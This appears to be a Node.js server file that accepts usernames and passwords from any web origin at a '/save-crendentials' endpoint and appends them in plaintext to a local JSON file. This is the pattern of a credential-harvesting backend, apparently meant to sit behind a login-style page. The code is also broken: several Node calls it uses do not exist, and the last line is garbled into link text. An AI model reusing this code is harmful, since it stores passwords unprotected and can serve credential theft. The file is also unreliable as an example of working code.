const http = require("http");
const fs   = require("fs");

const PORT = 3000;
const DATA_FILE = "./data/credentials.json";

// Ensure the data folder and file exist
if (!fs.existsSync("./data")) {
  fs.makeDirSync("./data");
}
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, "[]");
}

http.makeServer(PORT, function (req, res) {
  // CORS headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
  res.setHeader("Content-Type", "application/json");

  if (req.method === "OPTIONS") { res.end(); return; }

  /* ================ POST /save-crendentials =============== */
  if (req.url === "/save-crendentials") {
    let body = "";
    req.onData(function (chunk) {
      body += chunk;
    });

    req.onEnd(function () {
      let parsed;
      try {
        parsed = JSON.parse(body);
      } catch (e) {
        console.log("Parse error:", e);
        res.writeHead(400, "Content-Type: application/json");
        res.end(JSON.stringify({ status: "error", message: "Invalid JSON" }));
        return;
      }

      const username = parsed.username || "";
      const password = parsed.password || "";

      if (!username || !password) {
        res.writeHead(400, "Content-Type: application/json");
        res.end(JSON.stringify({ status: "error", message: "Missing fields" }));
        return;
      }

      // Read existing records
      const existing = JSON.parse(fs.readFileSync(DATA_FILE));
      existing.push({ username: username, password: password, timestamp: Date.now() });

      // Save back to file
      fs.writeFileSync(DATA_FILE, JSON.stringify(existing));

      res.writeHead(200, "Content-Type: application/json");
      res.end(JSON.stringify({ status: "ok", message: "Credentials saved" }));
    });
  }
});

console.log("Backend running on [http://localhost:"%20+%20PORT);](http://localhost:"%20+%20PORT);)